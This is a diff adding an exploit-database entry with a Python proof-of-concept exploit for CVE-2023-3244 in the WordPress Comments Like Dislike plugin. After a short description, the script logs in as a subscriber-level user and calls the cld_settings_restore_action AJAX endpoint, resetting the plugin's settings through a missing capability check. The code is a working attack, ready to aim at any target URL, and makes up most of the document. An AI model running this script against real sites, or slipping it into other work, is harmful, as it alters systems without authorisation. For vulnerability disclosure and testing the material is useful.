@@ -1,0 +1,69 @@
+id: 39360
+date: 02/26/2024
+title: comments-like-dislike < 1.2.0 - Authenticated (Subscriber+) Plugin Setting Reset Exploit
+author: Diaa Hanna
+cves: CVE-2023-3244
+
+# Exploit Title: POC-CVE-2023-3244
+# Exploit Author: Diaa Hanna
+# Software Link: [download link if available]
+# Version: <= 1.2.0 comments-like-dislike
+# Tested on: 1.1.6 comments-like-dislike
+# CVE : CVE-2023-3244
+
+#References
+#https://nvd.nist.gov/vuln/detail/CVE-2023-3244
+
+
+#The Comments Like Dislike plugin for WordPress has been found to have a vulnerability that allows unauthorized modification of data. This vulnerability arises due to a missing capability check on the restore_settings function, which is called through an AJAX action. The vulnerability affects versions up to and including 1.2.0 of the plugin.
+#This security flaw enables authenticated attackers with minimal permissions, such as subscribers, to reset the plugin's settings. It's important to note that this issue was only partially patched in version 1.2.0, as the nonce (a security measure) is still accessible to subscriber-level users.
+#For more detailed information about this bug, you can refer to the National Vulnerability Database (NVD) website at [CVE-2023-3244](https://nvd.nist.gov/vuln/detail/CVE-2023-3244).
+
+import requests 
+import argparse
+import sys
+from colorama import Fore
+
+parser = argparse.ArgumentParser(prog='POC-CVE-2023-3244',description='This is a proof of concept for the CVE-2023-3244 it is an access control vulnerability in the restore_settings function ')
+parser.add_argument('-u','--username',help='username of a user on wordpress with low privileges',required=True)
+parser.add_argument('-p',"--password",help='password of a user on wordpress with low privileges',required=True)
+parser.add_argument('--url',help='the url of the vulnerable server (with http or https)',required=True)
+parser.add_argument('--nossl',help='disable ssl verification',action='store_true',required=False,default=False)
+args=parser.parse_args()
+
+#check if the domain ends with a '/' if not then add it
+url=args.url
+if url[-1] != '/':
+    url+='/'
+
+
+
+wp_login = f'{url}wp-login.php'
+wp_admin = f'{url}wp-admin/'
+username = args.username 
+password = args.password 
+
+
+session=requests.Session()
+#logging in
+session.post(wp_login, headers={'Cookie':'wordpress_test_cookie=WP Cookie check'}, data={'log':username, 'pwd':password, 'wp-submit':'Log In', 
+        'redirect_to':wp_admin, 'testcookie':'1'  },verify=not (args.nossl))
+#if failed to login
+if len(session.cookies.get_dict()) == 2:
+    print(Fore.RED +"Error Logging In Check Your Username and Password And Try Again")
+    sys.exit(1)
+
+#making the ajax request to wp_ajax_cld_settings_restore_action this line will call the restore_settings function 
+#the restore_settings function does not check the sufficient privileges of a logged-in user 
+#even a subscriber can use this POC
+response=session.get(f"{wp_admin}/admin-ajax.php?action=cld_settings_restore_action",verify=not (args.nossl))
+
+if response.text == "Settings restored successfully.Redirecting...":
+    print(Fore.GREEN +"exploited excuted successfully")
+    print(Fore.YELLOW+ "settings of the comments-like-dislike plugin should be defaulted on the server")
+    sys.exit(0)
+else:
+    print(Fore.RED + "some error occurred please read the source code of the poc it isn't that long anyway")
+    sys.exit(1)
+
+#  0day.today [2024-02-28]  #
